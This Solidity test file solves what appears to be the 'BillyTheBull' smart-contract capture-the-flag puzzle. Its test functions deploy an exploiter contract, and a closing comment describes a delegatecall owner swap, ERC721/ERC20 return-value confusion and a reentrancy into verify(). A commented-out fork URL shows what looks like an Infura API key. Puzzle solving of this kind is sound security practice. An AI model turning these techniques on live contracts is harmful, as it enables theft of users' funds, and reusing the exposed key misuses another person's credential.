// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { FreeNFT } from "../src/tokens/FreeNFT.sol";
import { DeployScript } from "../script/Deploy.s.sol";
import { Exploiter } from "./Exploiter.sol";

contract BillyTheBullSolution is DeployScript, Test {
    BillyTheBull puzzle;
    NFTOutlet nftOutlet;
    address originalStablecoin;
    FreeNFT freeNft;
    address exploiter;

    function setUp() public {
        // vm.createSelectFork("https://mainnet.infura.io/v3/fb419f740b7e401bad5bec77d0d285a5");
        (
            address[] memory _stablecoins,
            address[] memory _nfts,
            address _puzzle,
            address _nftOutlet
        ) = deployAllContracts();
        console.log("Contracts Deployed:");
        for (uint i = 0; i < _stablecoins.length; i++) {
            console.log("Stablecoin:", _stablecoins[i]);
        }
        for (uint i = 0; i < _nfts.length; i++) {
            console.log("NFT:", _nfts[i]);
        }
        console.log("Puzzle:", _puzzle);
        console.log("NFT Outlet:", _nftOutlet);

        puzzle = BillyTheBull(_puzzle);
        nftOutlet = NFTOutlet(_nftOutlet);
        freeNft = FreeNFT(_nfts[2]);
        originalStablecoin = _stablecoins[0];
    }

    function testSolution() public {
        uint _start = puzzle.generate(address(this));
        uint tokenId1 = _start >> 128;
        uint tokenId2 = uint(uint128(_start));
        exploiter = address(new Exploiter(tokenId1, tokenId2));

        uint indexToMint = puzzle.nftPrice();
        freeNft.mint(exploiter, indexToMint);
        freeNft.mint(exploiter, indexToMint + 1e18);

        uint solution = uint160(exploiter);
        bool success = puzzle.verify(puzzle.generate(address(this)), solution);
        assertTrue(success);
    }

    function testCanSolveTwice() public {
        {
            uint _start = puzzle.generate(address(this));
            uint tokenId1 = _start >> 128;
            uint tokenId2 = uint(uint128(_start));
            exploiter = address(new Exploiter(tokenId1, tokenId2));

            uint indexToMint = puzzle.nftPrice();
            freeNft.mint(exploiter, indexToMint);
            freeNft.mint(exploiter, indexToMint + 1e18);

            uint solution = uint160(exploiter);
            bool success = puzzle.verify(puzzle.generate(address(this)), solution);
            assertTrue(success);
        }

        nftOutlet.changePaymentToken(originalStablecoin);

        {
            address second = makeAddr("second");
            vm.startPrank(second);
            uint _start = puzzle.generate(second);
            uint tokenId1 = _start >> 128;
            uint tokenId2 = uint(uint128(_start));
            exploiter = address(new Exploiter(tokenId1, tokenId2));

            uint indexToMint = puzzle.nftPrice();
            freeNft.mint(exploiter, indexToMint);
            freeNft.mint(exploiter, indexToMint + 1e18);

            uint solution = uint160(exploiter);
            bool success = puzzle.verify(puzzle.generate(second), solution);
            assertTrue(success);
            vm.stopPrank();
        }
    }

    // function testFailsWithAddrZeroSolution() public {}

    /**
    SOLUTION:
    - while the delegate call is happening, you can update owner
    - then you can call changeStablecoin
    - because all assets are grouped together, you can change it to an NFT
    - then change owner back before returning so the after check passes
    - now when collectStablecoin is called, we match the sig but don't return when we should (because ERC721 doesn't return from transferFrom)
    - this leads to a full revert, not a false return
    - the _returnedFalse check actually passes if the function fully reverts
    - as a result, no stablecoins are transferred
    - now we get to the nft mint
    - we mint an NFT and transfer it to impl
    - in the onERC721Received of impl, we can call back into verify() but not via curta contract
    - now we can put in dummy data to have it fail all checks but not revert
    - when it gets to the minting, it'll work against because reentrancy happens before
    - we don't have 2 nfts when it finshed but just returns false, that's fine
    - then the first mint finishes and we return true
    */

}
